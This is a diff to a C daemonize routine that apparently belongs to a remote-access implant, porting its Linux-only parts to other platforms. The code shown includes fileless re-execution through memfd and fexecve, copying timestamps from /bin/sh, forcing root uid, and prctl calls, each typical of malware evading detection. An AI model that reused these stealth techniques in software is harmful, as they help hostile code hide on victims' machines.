@@ -2,17 +2,20 @@
 #include <stdlib.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <limits.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <fcntl.h>
-#include <linux/fs.h>
 #include <unistd.h>
 #include <utime.h>
 #include <sys/stat.h>
-#include <sys/prctl.h>
 #include <string.h>
 #include <errno.h>
+#ifdef Linux
+#include <linux/fs.h>
+#include <sys/prctl.h>
 #include "memfd.h"
+#endif
 
 #ifndef DEFAULT_MTIME_FROM
  #define DEFAULT_MTIME_FROM "/bin/sh"
@@ -55,13 +58,17 @@
 
 #include "daemonize.h"
 
-int daemonize(int argc, char *argv[], char *env[], bool exit_parent) {
+pid_t daemonize(int argc, char *argv[], char *env[], bool exit_parent) {
     pid_t pid;
     int i;
 
     int pipes[2];
 
+#ifdef Linux
     setresuid(0, 0, 0);
+#else
+    setuid(0);
+#endif
 
     /* Cleanup environment and reexec */
     char self[PATH_MAX] = {};
@@ -108,9 +115,11 @@ int daemonize(int argc, char *argv[], char *env[], bool exit_parent) {
 
         int fd = -1;
 
+#ifdef Linux
         if (strstr(self, "/memfd")) {
             snprintf(self, sizeof(self), "/proc/%d/exe", getpid());
         }
+#endif
 
         struct stat _stat = {};
         stat(mtime_from, &_stat);
@@ -193,9 +202,11 @@ int daemonize(int argc, char *argv[], char *env[], bool exit_parent) {
                 if (r == 0)
                     close(envpipe[1]);
 
+#ifdef Linux
                 fexecve(fd, argv, env);
                 /* We shouldn't be here */
-                execve(move? move:self, argv, env);
+#endif 
+	    	execve(move? move:self, argv, env);
             }
 
             if (r == 0)
@@ -305,8 +316,10 @@ int daemonize(int argc, char *argv[], char *env[], bool exit_parent) {
     dup (0);
     /* stderror */
 
+#ifdef Linux
     prctl(4, 0, 0, 0, 0);
     prctl(31, 0, 0, 0, 0);
+#endif
 #endif
 
     /* do its daemon thing... */
